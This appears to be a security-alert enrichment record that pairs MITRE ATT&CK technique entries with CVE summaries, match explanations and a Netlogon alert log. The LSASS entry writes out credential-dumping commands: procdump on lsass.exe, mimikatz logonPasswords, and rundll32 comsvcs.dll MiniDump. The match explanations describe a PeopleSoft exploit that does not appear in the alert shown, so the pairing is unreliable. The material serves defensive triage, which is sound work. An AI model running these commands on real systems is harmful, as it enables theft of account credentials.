T1189.procedures: Software 'KARAE': KARAE was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure. Software 'IcedID': IcedID has cloned legitimate websites/applications to distribute the malware. Software 'Bundlore': Bundlore has been spread through malicious advertisements on websites. Software 'Bad Rabbit': Bad Rabbit spread through watering holes on popular sites by injecting JavaScript into the HTML body or a .js file. Software 'LoudMiner': LoudMiner is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS. Software 'SocGholish': SocGholish has been distributed through compromised websites with malicious content often masquerading as browser updates. Software 'REvil': REvil has infected victim machines through compromised websites and exploit kits. Software 'Grandoreiro': Grandoreiro has used compromised websites and Google Ads to bait victims into downloading its installer. Software 'Snip3': Snip3 has been delivered to targets via downloads from malicious domains. Software 'POORAIM': POORAIM has been delivered through compromised sites acting as watering holes. Group 'Transparent Tribe': Transparent Tribe has used websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools. Group 'RTM': RTM has distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising network Yandex.Direct. Group 'PLATINUM': PLATINUM has sometimes used drive-by attacks against vulnerable browser plugins. Group 'Windshift': Windshift has used compromised websites to register custom URL schemes on a remote system. Group 'Earth Lusca': Earth Lusca has performed watering hole attacks. Group 'APT38': APT38 has conducted watering holes schemes to gain initial access to victims. Group 'Axiom': Axiom has used watering hole attacks to gain access. Group 'APT19': APT19 performed a watering hole attack on forbes.com in 2014 to compromise targets. Group 'Darkhotel': Darkhotel used embedded iframes on hotel login portals to redirect selected victims to download malware. Group 'Andariel': Andariel has used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range. Group 'APT28': APT28 has compromised targets via strategic web compromise utilizing custom exploit kits. APT28 used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages. Group 'Dragonfly': Dragonfly has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit. Group 'Dark Caracal': Dark Caracal leveraged a watering hole to serve up malicious code. Group 'Turla': Turla has infected victims using watering holes. Group 'Patchwork': Patchwork has used watering holes to deliver files with exploits to initial victims. Group 'Leviathan': Leviathan has infected victims using watering holes. Group 'APT32': APT32 has infected victims by tricking them into visiting compromised watering hole websites. Group 'BRONZE BUTLER': BRONZE BUTLER compromised three Japanese websites using a Flash exploit to perform watering hole attacks. Group 'Lazarus Group': Lazarus Group delivered RATANKBA and other malicious code to victims via a compromised legitimate website. Group 'Threat Group-3390': Threat Group-3390 has extensively used strategic web compromises to target victims. Group 'Winter Vivern': Winter Vivern created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software. Group 'Elderwood': Elderwood has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector. Group 'Mustard Tempest': Mustard Tempest has used drive-by downloads for initial infection, often using fake browser updates as a lure. Group 'APT37': APT37 has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly. Group 'Leafminer': Leafminer has infected victims using watering holes. Group 'Machete': Machete has distributed Machete through a fake blog website. Group 'CURIUM': CURIUM has used strategic website compromise to infect victims with malware such as IMAPLoader. Group 'Daggerfly': Daggerfly has used strategic website compromise for initial access against victims. Group 'PROMETHIUM': PROMETHIUM has used watering hole attacks to deliver malicious versions of legitimate installers. Group 'Windigo': Windigo has distributed Windows malware via drive-by downloads. Group 'Magic Hound': Magic Hound has conducted watering-hole attacks through media and magazine websites. Group 'AppleJeus': During the 3CX Supply Chain Attack, AppleJeus compromised the `www.tradingtechnologies[.]com` website hosting a hidden IFRAME to exploit visitors, two months before the site was known to deliver a compromised version of the X_TRADER software package. Campaign '3CX Supply Chain Attack': During the 3CX Supply Chain Attack, AppleJeus compromised the `www.tradingtechnologies[.]com` website hosting a hidden IFRAME to exploit visitors, two months before the site was known to deliver a compromised version of the X_TRADER software package. Campaign 'Operation Dust Storm': During Operation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322. Campaign 'C0010': During C0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.

CVE-2026-35273.title: Oracle PeopleSoft Enterprise PeopleTools Missing Authentication for Critical Function Vulnerability
CVE-2026-35273.description: Vulnerability in the PeopleSoft Enterprise PeopleTools product of Oracle PeopleSoft (component: Updates Environment Management). Supported versions that are affected are 8.61 and 8.62. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise PeopleSoft Enterprise PeopleTools. Successful attacks of this vulnerability can result in takeover of PeopleSoft Enterprise PeopleTools. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
CVE-2026-35273.mitigations: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA’s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA’s “Forensics Triage Requirements” (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines. Not mitigations found in references.

CVE-2015-4852.title: Oracle WebLogic Server Deserialization of Untrusted Data Vulnerability
CVE-2015-4852.description: The WLS Security component in Oracle WebLogic Server 10.3.6.0, 12.1.2.0, 12.1.3.0, and 12.2.1.0 allows remote attackers to execute arbitrary commands via a crafted serialized Java object in T3 protocol traffic to TCP port 7001, related to oracle_common/modules/com.bea.core.apache.commons.collections.jar. NOTE: the scope of this CVE is limited to the WebLogic Server product.
CVE-2015-4852.mitigations: Apply updates per vendor instructions. Not mitigations found in references.

CVE-2015-7450.title: IBM WebSphere Application Server and Server Hypervisor Edition Code Injection.
CVE-2015-7450.description: Serialized-object interfaces in certain IBM analytics, business solutions, cognitive, IT infrastructure, and mobile and social products allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the InvokerTransformer class in the Apache Commons Collections library.
CVE-2015-7450.mitigations: Apply updates per vendor instructions. Not mitigations found in references.

mitre_evaluations.explanation: The alert shows a POST request to a specific servlet (/psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet) containing a serialized Java payload. This is a classic attempt to exploit a public-facing application (Oracle PeopleSoft) to gain initial access. The technique is highly relevant as it describes the exact nature of the attack observed.

While the payload involves code execution, T1203 focuses on exploiting 'client' applications (like browsers or office suites) typically via user interaction. The alert describes a server-side exploitation of a web service (PeopleSoft), which is a 'server-side' or 'public-facing' attack rather than a client-side execution attack.

The attack targets a specific service (EnvironmentManagementServlet) to execute commands (cmd=id). While the primary goal here is initial access via a public-facing app, the exploitation of a remote service to achieve execution is a valid description of the behavior seen in the log.

The attack is delivered via HTTP POST, which is a web protocol. However, T1071.001 is primarily a Command and Control (C2) technique used for communication after a breach. While the protocol is correct, the context of the alert is the 'Exploitation' phase rather than the 'C2' phase.

Drive-by compromise involves a user visiting a website and being compromised. The alert shows a direct, automated-looking POST request with a malicious payload targeting a specific backend servlet, which is a direct exploit attempt rather than a passive drive-by scenario.

cve_evaluations.explanation: This is a perfect match. The alert targets 'EnvironmentManagementServlet' in an Oracle PeopleSoft environment. The CVE describes a vulnerability in 'Oracle PeopleSoft Enterprise PeopleTools' specifically within the 'Updates Environment Management' component, allowing unauthenticated attackers to compromise the system via HTTP. The timing and product match perfectly.

The payload in the log contains a serialized Java object header (\xac\xed\x00\x05\x73\x72...), which is characteristic of Java deserialization attacks. While this CVE is for WebLogic and not PeopleSoft, the 'type' of attack (deserialization) is highly relevant to the observed payload structure.

Similar to the WebLogic CVE, this involves serialized-object interfaces and the Apache Commons Collections library. While the product (IBM WebSphere) does not match, the technical nature of the payload (Java deserialization) makes it a related technical concept, though less direct than the first CVE.

rule.description: Critical security event: Anomalous behavior or exploit payload detected by system monitoring.

original_alert.full_log: Jun 16 10:30:00 DC-PROD-01 Microsoft-Windows-Netlogon[5805]: The Netlogon service failed to authenticate the connection from the remote computer ATTACK-STATION. The following error occurred: Access is denied. Client Credential: 0000000000000000[...TRUNCATED_PAYLOAD...] NegotiationFlags: 0x212fffff

mitre.description: The alert indicates a critical security event where the Microsoft-Windows-Netlogon service on DC-PROD-01 failed to authenticate a connection from a remote computer (ATTACK-STATION) due to an 'Access is denied' error. The event involves the MS-NRPC protocol and targets the lsass.exe/netlogon process, suggesting potential exploitation attempts or anomalous behavior related to credential manipulation or service exploitation (MITRE T1190).
mitre.keywords: T1190, Netlogon authentication failure, MS-NRPC, lsass.exe

cve.description: No specific software versions, vulnerability identifiers, or CVE IDs were mentioned in the alert log.

T1210.name: Exploitation of Remote Services
T1210.description:
Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.

An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.

There are several well-known vulnerabilities that exist in common services such as SMB(Citation: CIS Multiple SMB Vulnerabilities) and RDP(Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL(Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)(Citation: Ars Technica VMWare Code Execution Vulnerability 2021) Additionally, there have been a number of vulnerabilities in VMware vCenter installations, which may enable threat actors to move laterally from the compromised vCenter server to virtual machines or even to ESXi hypervisors.(Citation: Broadcom VMSA-2024-0019)

Depending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.
T1210.mitigations:
Mitigation 'Disable or Remove Feature or Program': Minimize available services to only those that are necessary.
Mitigation 'Vulnerability Scanning': Regularly scan the internal network for available services to identify new and potentially vulnerable services.
Mitigation 'Exploit Protection': Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility and may not work for all software or services targeted.
Mitigation 'Network Segmentation': Segment networks and systems appropriately to reduce access to critical systems and services to controlled methods.
Mitigation 'Threat Intelligence Program': Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.
Mitigation 'Application Isolation and Sandboxing': Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist.
Mitigation 'Privileged Account Management': Minimize permissions and access for service accounts to limit impact of exploitation.
Mitigation 'Update Software': Update software regularly by employing patch management for internal enterprise endpoints and servers.
T1210.detections:
Detection Strategy: Exploitation of Remote Services – multi-platform lateral movement detection
- Analytic 'Analytic 0327': Correlates inbound network access to remote service ports (e.g., SMB/RPC 445/135, RDP 3389, WinRM 5985/5986) with near-time instability in the target service (crash, abnormal restart), suspicious child process creation under the service, and post-access lateral-movement behaviors. The chain indicates likely exploitation rather than normal administration.
- Analytic 'Analytic 0328': Links inbound network access to SSHD/SMB/NFS/Databases or custom daemons with subsequent daemon crash/restart, core dump, or spawning of shells/reverse shells from the service context, indicating remote exploitation.
- Analytic 'Analytic 0329': Detects exploitation targeting ESXi/vCenter by correlating attempts to reach known exploitable endpoints (OpenSLP 427, CIM 5989, Hostd/Vpxa HTTPS 443, ESXi SOAP) with vmkernel/hostd crashes, unexpected hostd/vpxa restarts, or new reverse/outbound connections from ESXi host/vCenter to internal assets.
- Analytic 'Analytic 0330': Ties inbound access to exposed services (ARD/VNC 5900, SSH 22, ScreenSharing, web services) with process crashes in unified logs and abnormal child processes spawned under those services (e.g., bash, curl) to indicate exploitation.
T1210.procedures:
Software 'Empire': Empire has a limited number of built-in modules for exploiting remote SMB, JBoss, and Jenkins servers.
Software 'PoshC2': PoshC2 contains a module for exploiting SMB via EternalBlue.
Software 'Flame': Flame can use MS10-061 to exploit a print spooler vulnerability in a remote system with a shared printer in order to move laterally.
Software 'WannaCry': WannaCry uses an exploit in SMBv1 to spread itself to other remote systems on a network.
Software 'Stuxnet': Stuxnet propagates using the MS10-061 Print Spooler and MS08-067 Windows Server Service vulnerabilities.
Software 'QakBot': QakBot can move laterally using worm-like functionality through exploitation of SMB.
Software 'Emotet': Emotet has been seen exploiting SMB via a vulnerability exploit like EternalBlue (MS17-010) to achieve lateral movement and propagation.
Software 'Bad Rabbit': Bad Rabbit used the EternalRomance SMB exploit to spread through victim networks.
Software 'NotPetya': NotPetya can use two exploits in SMBv1, EternalBlue and EternalRomance, to spread itself to other remote systems on the network.
Software 'InvisiMole': InvisiMole can spread within a network via the BlueKeep (CVE-2019-0708) and EternalBlue (CVE-2017-0144) vulnerabilities in RDP and SMB respectively.
Software 'Conficker': Conficker exploited the MS08-067 Windows vulnerability for remote code execution through a crafted RPC request.
Software 'Lucifer': Lucifer can exploit multiple vulnerabilities including EternalBlue (CVE-2017-0144) and EternalRomance (CVE-2017-0144).
Software 'TrickBot': TrickBot utilizes EternalBlue and EternalRomance exploits for lateral movement in the modules wormwinDll, wormDll, mwormDll, nwormDll, tabDll.
Group 'Wizard Spider': Wizard Spider has exploited or attempted to exploit Zerologon (CVE-2020-1472) and EternalBlue (MS17-010) vulnerabilities.
Group 'Fox Kitten': Fox Kitten has exploited known vulnerabilities in remote services including RDP.
Group 'Earth Lusca': Earth Lusca has used Mimikatz to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).
Group 'Ember Bear': Ember Bear has used exploits for vulnerabilities such as MS17-010, also known as `Eternal Blue`, during operations.
Group 'APT28': APT28 exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.
Group 'Tonto Team': Tonto Team has used EternalBlue exploits for lateral movement.
Group 'menuPass': menuPass has used tools to exploit the ZeroLogon vulnerability (CVE-2020-1472).
Group 'Dragonfly': Dragonfly has exploited a Windows Netlogon vulnerability (CVE-2020-1472) to obtain access to Windows Active Directory servers.
Group 'MuddyWater': MuddyWater has exploited the Microsoft Netlogon vulnerability (CVE-2020-1472).
Group 'Threat Group-3390': Threat Group-3390 has exploited MS17-010 to move laterally to other systems on the network.
Group 'FIN7': FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.

T1212.name: Exploitation for Credential Access
T1212.description:
Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. 

Credentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)

Such exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)

Exploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.
T1212.mitigations:
Mitigation 'Exploit Protection': Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior. Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring. Many of these protections depend on the architecture and target application binary for compatibility and may not work for software targeted for defense evasion.
Mitigation 'Update Software': Update software regularly by employing patch management for internal enterprise endpoints and servers.
Mitigation 'Application Developer Guidance': Application developers should consider taking measures to validate authentication requests by enabling one-time passwords, providing timestamps or sequence numbers for messages sent, using digital signatures, and/or using random session keys.
Mitigation 'Threat Intelligence Program': Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization.
Mitigation 'Application Isolation and Sandboxing': Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing. Other types of virtualization and application microsegmentation may also mitigate the impact of some types of exploitation. Risks of additional exploits and weaknesses in these systems may still exist.
T1212.detections:
Detection Strategy: Detection Strategy for Exploitation for Credential Access
- Analytic 'Analytic 0493': Detects adversary exploitation of authentication mechanisms or credential validation processes. Defender perspective includes forged Kerberos tickets (e.g., MS14-068), abnormal LSASS memory access, replayed authentication attempts, and unexpected crashes of authentication services. Multi-event correlation ties exploitation attempts to abnormal process creation, service instability, and suspicious authentication events.
- Analytic 'Analytic 0494': Detects exploitation of authentication daemons or PAM modules. Defender perspective includes failed or anomalous PAM authentications, abnormal segfaults in authentication services, and exploitation attempts followed by successful unauthorized logins. Correlation identifies memory corruption, replay attempts, and privilege escalation tied to credential services.
- Analytic 'Analytic 0495': Detects exploitation attempts against macOS authentication frameworks such as OpenDirectory or Keychain. Defender perspective includes abnormal crashes in opendirectoryd, unauthorized Keychain API usage, and unusual sudo or login events. Correlation links unexpected process behavior with credential access anomalies.
- Analytic 'Analytic 0496': Detects exploitation of vulnerabilities in cloud identity providers (IdPs) such as Azure AD or Okta for credential access. Defender perspective includes anomalous token creation or renewal, authentication bypass events, and API abuse to mint unauthorized tokens. Correlation highlights exploitation attempts tied to absent or inconsistent audit logs.
T1212.procedures:
Group 'UNC3886': UNC3886 exploited CVE-2022-22948 in VMware vCenter to obtain encrypted credentials from the vCenter postgresDB.
Group 'Leviathan': Leviathan Australian Intrusions was conducted by the Leviathan threat actor.Leviathan exploited vulnerable network appliances during Leviathan Australian Intrusions, leading to the collection and exfiltration of valid credentials.
Campaign 'Leviathan Australian Intrusions': Leviathan exploited vulnerable network appliances during Leviathan Australian Intrusions, leading to the collection and exfiltration of valid credentials.

T1207.name: Rogue Domain Controller
T1207.description:
Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. (Citation: DCShadow Blog) Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.

Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash. (Citation: Adsecurity Mimikatz Guide)

This technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). (Citation: DCShadow Blog) The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [SID-History Injection](https://attack.mitre.org/techniques/T1134/005) and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for Persistence. (Citation: DCShadow Blog)
T1207.detections:
Detection Strategy: Detection Strategy for Rogue Domain Controller (DCShadow) Registration and Replication Abuse
- Analytic 'Analytic 0770': Detection of rogue Domain Controller registration and Active Directory replication abuse by correlating: (1) creation/modification of nTDSDSA and server objects in the Configuration partition, (2) unexpected usage of Directory Replication Service SPNs (GC/ or E3514235-4B06-11D1-AB04-00C04FC2DCD2), (3) replication RPC calls (DrsAddEntry, DrsReplicaAdd, GetNCChanges) originating from non-DC hosts, and (4) Kerberos authentication by non-DC machines using DRS-related SPNs. These events in combination, especially from hosts outside the Domain Controllers OU, may indicate DCShadow or rogue DC activity.
T1207.procedures: Software 'Mimikatz': Mimikatz’s LSADUMP::DCShadow module can be used to make AD updates by temporarily setting a computer to be a DC.

T1003.001.name: LSASS Memory
T1003.001.description: Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550). As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host use procdump: * procdump -ma lsass.exe lsass_dump Locally, mimikatz can be run using: * sekurlsa::Minidump lsassdump.dmp * sekurlsa::logonPasswords Built-in Windows tools such as `comsvcs.dll` can also be used: * rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector) Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS) Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages and HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014) The following SSPs can be used to access credentials: * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection) * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
T1003.001.mitigations:
Mitigation 'Operating System Configuration': Consider disabling or restricting NTLM. Consider disabling WDigest authentication.
Mitigation 'Credential Access Protection': With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping. It is not configured by default and has hardware and firmware system requirements. It also does not protect against all forms of credential dumping.
Mitigation 'Privileged Process Integrity': On Windows 8.1 and Windows Server 2012 R2, enable Protected Process Light for LSA.
Mitigation 'Privileged Account Management': Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.
Mitigation 'User Training': Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.
Mitigation 'Behavior Prevention on Endpoint': On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing.
Mitigation 'Password Policies': Ensure that local administrator accounts have complex, unique passwords across all systems on the network.
T1003.001.detections:
Detection Strategy: Detection of Credential Dumping from LSASS Memory via Access and Dump Sequence
- Analytic 'Analytic 1030': A non-privileged or abnormal process attempts to open a handle with full access (0x1F0FFF) to lsass.exe and subsequently invokes memory dump, file creation, or registry modification indicative of credential scraping. This behavior chain reflects staged credential theft activity.
T1003.001.procedures: Software 'SILENTTRINITY': SILENTTRINITY can create a memory dump of LSASS via the `MiniDumpWriteDump Win32` API call. Software 'LaZagne': LaZagne can perform credential dumping from memory to obtain account and password information. Software 'Lslsass': Lslsass can dump active logon session password hashes from the lsass process. Software 'Impacket': SecretsDump and Mimikatz modules within Impacket can perform credential dumping to obtain account and password information. Software 'Pupy': Pupy can execute Lazagne as well as Mimikatz using PowerShell. Software 'PoshC2': PoshC2 contains an implementation of Mimikatz to gather credentials from memory. Software 'Windows Credential Editor': Windows Credential Editor can dump credentials. Software 'Mimikatz': Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the LSASS Memory. Software 'Empire': Empire contains an implementation of Mimikatz to gather credentials from memory. Software 'Sliver': Sliver has a built-in `procdump` command allowing for retrieval of memory from processes such as `lsass.exe` for credential harvesting. Software 'PowerSploit': PowerSploit contains a collection of Exfiltration modules that can harvest credentials using Mimikatz. Software 'Lizar': Lizar can run Mimikatz to harvest credentials. Software 'Bad Rabbit': Bad Rabbit has used Mimikatz to harvest credentials from the victim's machine. Software 'CozyCar': CozyCar has executed Mimikatz to harvest stored credentials from the victim and further victim penetration. Software 'NotPetya': NotPetya contains a modified version of Mimikatz to help gather credentials that are later used for lateral movement. Software 'Cobalt Strike': Cobalt Strike can spawn a job to inject into LSASS memory and dump password hashes. Software 'PoetRAT': PoetRAT used voStro.exe, a compiled pypykatz (Python version of Mimikatz), to steal credentials. Software 'Emotet': Emotet has been observed dropping and executing password grabber modules including Mimikatz. Software 'Net Crawler': Net Crawler uses credential dumpers such as Mimikatz and Windows Credential Editor to extract cached credentials from Windows systems. Software 'Qilin': Qilin can employ an embedded Mimikatz module to dump LSASS memory. Software 'Pysa': Pysa can perform OS credential dumping using Mimikatz. Software 'Daserf': Daserf leverages Mimikatz and Windows Credential Editor to steal credentials. Software 'Mafalda': Mafalda can dump password hashes from `LSASS.exe`. Software 'Olympic Destroyer': Olympic Destroyer contains a module that tries to obtain credentials from LSASS, similar to Mimikatz. These credentials are used with PsExec and Windows Management Instrumentation to help the malware propagate itself across a network. Software 'Okrum': Okrum was seen using MimikatzLite to perform credential dumping. Software 'GreyEnergy': GreyEnergy has a module for Mimikatz to collect Windows credentials from the victim’s machine. Group 'Indrik Spider': Indrik Spider used Cobalt Strike to carry out credential dumping using ProcDump. Group 'OilRig': OilRig has used credential dumping tools such as Mimikatz to steal credentials to accounts logged into the compromised system and to Outlook Web Access. Group 'Cleaver': Cleaver has been known to dump credentials using Mimikatz and Windows Credential Editor. Group 'Leafminer': Leafminer used several tools for retrieving login and password information, including LaZagne and Mimikatz. Group 'Threat Group-3390': Threat Group-3390 actors have used a modified version of Mimikatz called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers. Group 'APT1': APT1 has been known to use credential dumping using Mimikatz. Group 'Leviathan': Leviathan has used publicly available tools to dump password hashes, including ProcDump and WCE. Group 'FIN8': FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE). Group 'HAFNIUM': HAFNIUM has used procdump to dump the LSASS process memory. Group 'Blue Mockingbird': Blue Mockingbird has used Mimikatz to retrieve credentials from LSASS memory. Group 'Volt Typhoon': Volt Typhoon has attempted to access hashed credentials from the LSASS process memory space. Group 'Whitefly': Whitefly has used Mimikatz to obtain credentials. Group 'APT33': APT33 has used a variety of publicly available tools like LaZagne, Mimikatz, and ProcDump to dump credentials. Group 'FIN13': FIN13 has obtained memory dumps with ProcDump to parse and extract credentials from a victim's LSASS process memory with Mimikatz. Group 'APT32': APT32 used Mimikatz and customized versions of Windows Credential Dumper to harvest credentials. Group 'MirrorFace': MirrorFace has dumped LSASS memory for credential access. Group 'VOID MANTICORE': VOID MANTICORE has dumped LSASS credentials using `comsvcs.dll` via `rundll32.exe`.During HomeLand Justice, threat actors dumped LSASS memory on compromised hosts. Group 'Mustang Panda': Mustang Panda has harvested credentials from memory of lssas.exe with Mimikatz. Group 'Agrius': Agrius used tools such as Mimikatz to dump LSASS memory to capture credentials in victim environments. Group 'GALLIUM': GALLIUM used a modified version of Mimikatz along with a PowerShell-based Mimikatz to dump credentials on the victim machines. Group 'APT5': APT5 has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. APT5 has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive. Group 'Medusa Group': Medusa Group has leveraged Mimikatz to dump LSASS to harvest credentials. Group 'BRONZE BUTLER': BRONZE BUTLER has used various tools (such as Mimikatz and WCE) to perform credential dumping. Group 'APT39': APT39 has used Mimikatz, Windows Credential Editor and ProcDump to dump credentials. Group 'Magic Hound': Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz. Group 'Earth Lusca': Earth Lusca has used ProcDump to obtain the hashes of credentials by dumping the memory of the LSASS process. Group 'UNC3886': UNC3886 has used MiniDump to dump process memory and search for cleartext credentials. Group 'PLATINUM': PLATINUM has used keyloggers that are also capable of dumping credentials. Group 'Fox Kitten': Fox Kitten has used prodump to dump credentials from LSASS. Group 'Silence': Silence has used the Farse6.1 utility (based on Mimikatz) to extract credentials from lsass.exe. Group 'Sandworm Team': Sandworm Team has used its plainpwd tool, a modified version of Mimikatz, and comsvcs.dll to dump Windows credentials from system memory. During the 2016 Ukraine Electric Power Attack, Sandworm Team used Mimikatz to capture and use legitimate credentials. Group 'Moonstone Sleet': Moonstone Sleet retrieved credentials from LSASS memory. Group 'MuddyWater': MuddyWater has performed credential dumping with Mimikatz and procdump64.exe. Group 'Wizard Spider': Wizard Spider has dumped the lsass.exe memory to harvest credentials with the use of open-source tool LaZagne. Group 'Aquatic Panda': Aquatic Panda has attempted to harvest credentials through LSASS memory dumping. Group 'Ke3chang': Ke3chang has dumped credentials, including by using Mimikatz. Group 'APT3': APT3 has used a tool to dump credentials by injecting itself into lsass.exe and triggering with the argument "dig." Group 'APT41': APT41 has used hashdump, Mimikatz, Procdump, and the Windows Credential Editor to dump password hashes from memory and authenticate to other user accounts. Group 'FIN6': FIN6 has used Windows Credential Editor for credential dumping. Group 'Ember Bear': Ember Bear uses legitimate Sysinternals tools such as procdump to dump LSASS memory. Group 'APT28': APT28 